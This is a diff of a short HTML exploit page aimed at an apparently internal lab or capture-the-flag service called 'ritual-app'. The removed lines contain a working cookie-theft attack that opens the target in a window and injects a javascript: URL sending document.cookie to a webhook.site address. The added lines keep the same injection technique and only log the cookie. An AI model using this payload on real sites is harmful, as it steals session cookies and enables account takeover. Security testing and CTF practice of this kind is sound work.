@@ -1,22 +1,13 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>exploit</title>
 <script>
-const WEBHOOK = "https://webhook.site/17319d7a-3d98-427b-83ae-6a3cddad1e1a";
-const TARGET = "http://ritual-app:5000/nope";
+const w = window.open("http://ritual-app:5000/nope", "_blank");
 
-const w = window.open(TARGET, "_blank");
-
-let tried = 0;
+let c = 0;
 const t = setInterval(() => {
   try {
-    w.location =
-      "javascript:(()=>{" +
-      "location='" + WEBHOOK + "?c='+encodeURIComponent(document.cookie)" +
-      "})()";
+    w.location = "javascript:console.log(document.cookie)";
   } catch (e) {}
-
-  tried++;
-  if (tried > 15) clearInterval(t);
+  if (++c > 15) clearInterval(t);
 }, 200);
 </script>
